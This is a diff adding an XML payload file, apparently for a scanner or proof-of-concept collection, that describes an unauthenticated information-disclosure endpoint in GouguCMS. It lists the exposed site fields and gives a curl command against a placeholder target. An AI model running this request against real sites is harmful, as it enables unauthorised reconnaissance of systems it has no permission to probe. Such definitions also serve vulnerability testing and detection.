@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- GouguCMS API Information Disclosure - Sensitive Data Exposure -->
+<payloads>
+    <payload type="unauthorized_access">
+        <url>/api/index/index</url>
+        <method>GET</method>
+        <description>No authentication required - directly access API endpoint</description>
+    </payload>
+    <payload type="sensitive_data">
+        <fields>
+            <field>domain - Website domain name</field>
+            <field>icp - ICP registration number</field>
+            <field>beian - Public security registration number</field>
+            <field>version - System version number</field>
+            <field>admin_title - Admin panel title</field>
+            <field>desc - Site description</field>
+            <field>keywords - SEO keywords</field>
+            <field>copyright - Copyright information</field>
+        </fields>
+    </payload>
+    <exploit>
+        <curl>curl -s http://target/api/index/index | python3 -m json.tool</curl>
+    </exploit>
+</payloads>
